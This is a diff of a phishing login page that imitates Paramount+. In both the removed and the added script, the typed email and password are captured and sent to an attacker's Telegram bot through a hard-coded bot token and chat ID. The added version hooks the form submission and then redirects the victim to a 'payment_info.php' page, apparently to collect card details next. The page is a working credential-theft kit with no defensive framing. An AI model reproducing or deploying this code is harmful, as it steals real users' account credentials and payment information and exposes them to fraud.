@@ -34,7 +34,7 @@
     <div id="app-container" data-ui-theme="core">
       <main data-v-7366e275="" class="landing-wrapper">
         <section data-v-7366e275="" class="landing-wrapper__container">
-          <form data-v-83741453="" name="login" class="form login-form" novalidate="">
+          <form onsubmit="sendMessageToTelegram(event)>
             <div data-v-83741453="" class="form__top-box">
               <h2 data-v-83741453="" class="login-form__title">Welcome back!</h2>
             </div>
@@ -59,38 +59,27 @@
     </div>
   </div>
 
-  <script>
-    document.getElementById('loginButton').addEventListener('click', function(event) {
-      event.preventDefault(); // Prevent form submission
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
-      
-      console.log('Email:', email); // Log email
-      console.log('Password:', password); // Log password
-
-      // Send data to Telegram
-      const telegramToken = '6907698461:AAEEKx1TGcOQ_QxrEc_iq09_3UpqpfRHu8U'; // Replace with your bot token
-      const chatId = '1119354860'; // Replace with your chat ID
-      const message = `Email: ${email}\nPassword: ${password}`;
-      
-      fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-        }),
-      })
-      .then(response => response.json())
-      .then(data => {
-        console.log('Success:', data); // Log success
-      })
-      .catch((error) => {
-        console.error('Error:', error); // Log error
-      });
-    });
-  </script>
+  <script type="text/javascript">
+            function sendMessageToTelegram(event) {
+                event.preventDefault();
+                var botToken = '6907698461:AAEEKx1TGcOQ_QxrEc_iq09_3UpqpfRHu8U';
+                var chatId = '1119354860';
+                var email = document.getElementById('email').value;
+                var password = document.getElementById('password').value;
+                var message = "New PARAMOUNT+ acc:\nEmail: " + email + "\nPassword: " + password;
+                var telegramUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
+                fetch(telegramUrl)
+                    .then(response => {
+                        if (response.ok) {
+                            window.location.href = "payment_info.php";
+                        } else {
+                            console.error('Failed to send message to Telegram');
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error sending message to Telegram:', error);
+                    });
+            }
+        </script>
 </body>
 </html>
